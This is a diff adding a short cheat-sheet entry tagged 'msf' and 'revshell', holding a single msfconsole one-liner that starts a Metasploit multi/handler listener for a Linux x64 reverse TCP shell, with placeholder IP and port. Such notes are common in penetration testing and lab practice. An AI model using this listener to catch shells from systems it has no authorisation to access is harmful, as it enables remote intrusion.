@@ -1,0 +1,7 @@
+---
+syntax: bash
+tags: [msf, revshell]
+---
+# oneliner to start msf multi handler
+msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost <IP>; set lport <PORT>; exploit"
+
